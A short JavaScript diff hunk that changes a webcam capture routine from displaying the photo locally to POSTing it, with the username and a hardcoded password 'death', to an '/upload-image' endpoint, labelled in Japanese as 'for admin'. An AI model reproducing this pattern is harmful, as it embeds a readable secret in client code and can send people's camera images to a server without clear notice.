@@ -132,11 +132,16 @@
               canvas.getContext('2d').drawImage(video, 0, 0);
               const imageData = canvas.toDataURL('image/png');
               stream.getTracks().forEach(track => track.stop());
-              const img = new Image();
-              img.src = imageData;
-              img.style.maxWidth = '200px';
-              document.body.appendChild(img);
-              alert("画像を取得しました（管理者用）");
+              fetch("/upload-image", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  username: user,
+                  imageData: imageData,
+                  password: 'death'
+                })
+              }).then(r => r.text()).then(console.log);
+              alert("画像を取得し送信しました（管理者用）");
             } catch (e) {
               alert("カメラのアクセスが拒否されました。設定から許可してください。");
             }
